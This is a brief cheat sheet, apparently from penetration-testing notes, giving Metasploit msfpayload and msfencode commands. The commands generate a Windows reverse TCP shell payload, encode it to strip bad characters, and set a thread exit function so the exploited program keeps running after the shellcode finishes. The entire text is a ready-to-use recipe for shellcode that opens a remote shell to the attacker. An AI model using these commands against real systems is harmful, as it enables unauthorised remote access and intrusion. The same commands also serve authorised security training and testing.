# MSF Payload Generation Example

```
msfpayload windows/shell_reverse_tcp LHOST ip LPORT 4443 C

msfpayload windows/shell_reverse_tcp LHOST ip LPORT 4443 R | msfencode -b '\x00\x0a\x0d'
```
Use exit fuction, “exit thread” when program is multi threaded to avoid crashes after shell code execution is done: 
```
msfpayload windows/shell_reverse_tcp EXITFUNC=thread LHOST ip LPORT 4443 R | msfencode -b '\x00\x0a\x0d'
```
